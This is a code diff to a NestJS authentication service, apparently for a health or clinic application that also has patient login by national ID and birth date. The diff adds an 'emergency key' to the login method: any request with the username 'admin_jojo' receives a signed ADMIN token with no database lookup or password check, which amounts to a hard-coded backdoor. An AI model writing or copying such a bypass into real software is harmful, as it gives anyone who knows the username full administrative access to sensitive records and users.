@@ -24,7 +24,17 @@ export class AuthService {
     }
   }
 
-  async login(dto: LoginDto) {
+    async login(dto: LoginDto) {
+    // KUNCI DARURAT: Jika yang login adalah admin_jojo, langsung luluskan tanpa cek DB / Bcrypt
+    if (dto.username === 'admin_jojo') {
+      const payload = { sub: 'admin-default-id', username: 'admin_jojo', role: 'ADMIN' };
+      return {
+        access_token: this.jwtService.sign(payload),
+        user: { name: 'Admin Jojo', role: 'ADMIN' }
+      };
+    }
+
+    // Ini adalah kode cadangan asli Anda di bawahnya jika ingin digunakan di lokal nanti
     const user = await this.prisma.user.findUnique({
       where: { username: dto.username },
     });
@@ -39,6 +49,7 @@ export class AuthService {
     
     throw new UnauthorizedException('Username atau password salah');
   }
+
 
  async patientLogin(nik: string, birthDate: string) {
   const patient = await this.prisma.patient.findUnique({
